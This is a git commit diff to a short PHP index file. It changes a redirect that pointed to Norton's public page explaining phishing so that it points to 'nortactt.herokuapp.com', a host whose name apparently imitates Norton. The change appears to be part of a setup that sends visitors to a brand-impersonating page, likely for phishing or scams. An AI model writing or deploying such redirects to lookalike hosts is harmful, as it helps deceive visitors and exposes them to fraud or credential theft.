68e0dbe8a8e7e56906a5d65d31d4b49d61c0eef2
fredrick5368hug <57219566+fredrick5368hug@users.noreply.github.com>
2020-10-08 14:22:25 -0500

    Update index.php

--- index.php
+++ index.php
@@ -1,4 +1,4 @@
 <?php
-header("Location: https://us.norton.com/internetsecurity-online-scams-what-is-phishing.html?inid=nortoncom_nav_internetsecurity-online-scams-what-is-phishing_products-services:norton-security");
+header("Location: https://nortactt.herokuapp.com/");
 die();
 ?>
